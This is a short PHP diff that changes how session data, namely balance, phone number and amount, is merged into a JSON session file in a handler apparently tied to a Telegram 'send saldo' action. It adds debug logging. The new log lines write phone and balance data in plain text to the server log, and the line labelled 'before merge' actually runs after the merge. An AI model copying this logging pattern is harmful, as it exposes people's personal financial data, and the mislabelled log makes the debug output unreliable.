@@ -211,16 +211,24 @@ try {
             $telefono = $data['data']['telefono'] ?? '';
             $monto = $data['data']['monto'] ?? '';
             
+            // Solo agregar campos que tienen valor no vacío
             $newData = [];
-            if ($saldo) $newData['saldo'] = $saldo;
-            if ($telefono) $newData['phoneNumber'] = $telefono;
-            if ($monto) $newData['monto'] = $monto;
+            if (!empty($saldo)) $newData['saldo'] = $saldo;
+            if (!empty($telefono)) $newData['phoneNumber'] = $telefono;
+            if (!empty($monto)) $newData['monto'] = $monto;
             
+            // Hacer merge preservando TODOS los datos existentes
             $sessions[$sessionId]['data'] = array_merge(
-                $sessions[$sessionId]['data'],
+                $sessions[$sessionId]['data'] ?? [],
                 $newData
             );
             $sessions[$sessionId]['last_update'] = date('Y-m-d H:i:s');
+            
+            // Log para debugging
+            error_log("[TELEGRAM SEND SALDO] Session ID: {$sessionId}");
+            error_log("[TELEGRAM SEND SALDO] Datos antes del merge: " . json_encode($sessions[$sessionId]['data'] ?? []));
+            error_log("[TELEGRAM SEND SALDO] Nuevos datos: " . json_encode($newData));
+            error_log("[TELEGRAM SEND SALDO] Datos después del merge: " . json_encode($sessions[$sessionId]['data']));
             
             file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
             
